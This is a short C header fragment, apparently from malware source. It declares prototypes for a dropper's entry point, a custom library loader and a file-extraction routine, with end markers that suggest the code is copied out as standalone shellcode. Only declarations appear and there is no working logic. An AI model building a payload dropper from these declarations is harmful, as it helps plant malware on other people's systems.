//int WINAPI DropperScoutEntryPoint(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
typedef struct _MY_PARAMS
{
	ULONG uSize;
	PCHAR pBuffer;
	DropperHeader *header;
} MY_PARAMS, *PMY_PARAMS;


int WINAPI DropperScoutEntryPoint(DropperHeader *header);
FUNCTION_END_DECL(DropperScoutEntryPoint);

LPVOID WINAPI _LoadLibrary(PMY_PARAMS pParams);
FUNCTION_END_DECL(_LoadLibrary);

BOOL WINAPI ExtractFile(CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader *header);
FUNCTION_END_DECL(ExtractFile);